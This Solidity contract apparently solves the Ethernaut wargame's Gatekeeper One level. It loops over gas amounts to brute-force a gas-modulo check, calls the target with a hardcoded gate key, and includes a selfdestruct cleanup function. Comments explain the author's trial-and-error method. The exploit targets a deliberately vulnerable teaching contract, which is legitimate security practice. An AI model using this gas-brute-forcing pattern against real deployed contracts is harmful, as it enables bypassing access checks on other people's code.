//SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract EthernautLevel12 {
    address gatekeeperContractAddress =
        0xb981986aD8CC949B898347C42Afe0b5cF9D880Dc;
    bytes8 gateKey = 0x000000010000e16c; //Key obtained from methods as discussed in gate_key.

    //Tried to measure gas by looking at opcodes but there were many factors like different compiler
    //versions so couldn't reach the required answer using this.

    //After much research tried a brute-force method.This was more gas expensive and required a lot of tries
    //before I found a value which worked. At worst it would have taken 32-ish tries(contract deployments and function calls) with a step-increase of 500
    //gas in each try, not counting the 500 tries in each iteration.
    //We have to find a value such that x % 8191 = 0 so at worst it would take 8190 tries with brute force.
    //Observing the gas values for failed calls the gas used was always 1539 so at worst our tries would be
    //around 1539-ish. Nevertherless it wasn't really optimal but a resolution was reached using this way.

    function attackGatekeeper() external {
        for (uint256 i = 0; i < 500; i++) {
            (bool success, ) = gatekeeperContractAddress.call{
                gas: i + 8191 * 3
            }(abi.encodeWithSignature("enter(bytes8)", gateKey)); //Increased the gas amount a little just in case.

            if (success) {
                break;
            }
        }
    }

    //for cleanup if required.
    function selfDestruct() external {
        selfdestruct(0xC7005fe8AF6ca11FcC0092D3C4C5C3D883eCE16c);
    }
}
